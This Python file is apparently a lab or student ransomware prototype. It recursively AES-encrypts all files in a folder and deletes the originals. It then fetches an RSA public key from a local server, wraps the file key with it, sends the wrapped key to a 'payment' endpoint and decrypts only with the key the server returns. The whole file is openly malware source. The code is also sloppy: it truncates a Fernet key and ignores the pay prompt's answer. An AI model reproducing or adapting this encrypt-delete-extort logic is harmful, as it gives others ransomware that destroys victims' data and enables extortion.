import requests
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import rsa
import logging

iv = None

def generate_key():
    key_size = 16
    key = Fernet.generate_key()
    key = key[:key_size]
    return key

def encrypt_file(key, file):
    with open(file, 'rb') as f:
        data = f.read()

    # Pad the data to a multiple of 16 bytes
    padded_data = data + b"\0" * (16 - len(data) % 16)

    # Generate a random 16-byte IV
    iv = os.urandom(16)

    # Create an AES cipher object with the key and IV
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())

    # Encrypt the data
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    return iv, encrypted_data

def decrypt_file(key, iv, encrypted_data):
    # Create a cipher object with the key and IV
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())

    # Decrypt the data
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Unpad the data
    data = padded_data.rstrip(b"\0")

    return data
def encrypt_folder_recursive(key, folder):
    for root, dirs, files in os.walk(folder):
        for file in files:
            file_path = os.path.join(root, file)
            iv, encrypted_data = encrypt_file(key, file_path)

            # Save the encrypted file with the same folder structure
            encrypted_file_path = file_path + ".enc"
            with open(encrypted_file_path, 'wb') as f:
                f.write(iv + encrypted_data)

            # Delete the original file after encryption
            os.remove(file_path)

def decrypt_folder_recursive(key, folder):
    for root, dirs, files in os.walk(folder):
        for file in files:
            file_path = os.path.join(root, file)

            # Check if the file has the ".enc" extension
            if file_path.endswith(".enc"):
                iv_and_data = open(file_path, 'rb').read()

                # Extract IV and encrypted data from the file
                iv = iv_and_data[:16]
                encrypted_data = iv_and_data[16:]

                # Decrypt the file
                decrypted_data = decrypt_file(key, iv, encrypted_data)

                # Remove the ".enc" extension from the file name
                decrypted_file_path = file_path[:-4]

                # Save the decrypted file
                with open(decrypted_file_path, 'wb') as f:
                    f.write(decrypted_data)

                # Delete the encrypted file after decryption
                os.remove(file_path)


def send_encypted_key(data):
    response = requests.post('http://127.0.0.1:12345/receive_encryptedKey', data={'data': data})
    return response.text

def receive_public_key():
    response = requests.get('http://127.0.0.1:12345/send_public_key')
    return response.text

def send_payment():
    data = 49856
    response = requests.post('http://127.0.0.1:12345/payment', data={'data': data})
    print(response.text)
    return response.text

def encrypt_key(key, public_key):
    # Convert the public key to an rsa object
    public_key = rsa.PublicKey.load_pkcs1(public_key)
    cipher_rsa = rsa.encrypt(key, public_key)
    return cipher_rsa

if __name__ == "__main__":
    key_original = generate_key()

    # Encrypt an entire folder and its subfolders
    folder_to_encrypt = 'random'
    encrypt_folder_recursive(key_original, folder_to_encrypt)
    # save the key to a file
    # Get the user's desktop folder path
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    # Create the full file path on the desktop
    file_path = os.path.join(desktop_path, 'key.key')
    with open(file_path, 'wb') as f:
        f.write(key_original)

    public_key = receive_public_key()
    # save the key to a file
    with open('public_key.pem', 'wb') as f:
        f.write(public_key.encode('utf-8'))
    
    key_encrypted = encrypt_key(key_original, public_key)

    print("Encrypted key:", key_encrypted)
    key_encrypted = key_encrypted.hex()
    print("Encrypted key:", key_encrypted)
    response = send_encypted_key(key_encrypted)

    check = input("Do you want to pay? (y/n)")
    sendingPay = send_payment()
    print("Server Response:", sendingPay)
    sendingPay = bytes(sendingPay, 'utf-8')

    # Decrypt the entire folder and its subfolders
    folder_to_decrypt = 'random'
    decrypt_folder_recursive(sendingPay, folder_to_decrypt)

    input("Press Enter to exit...")
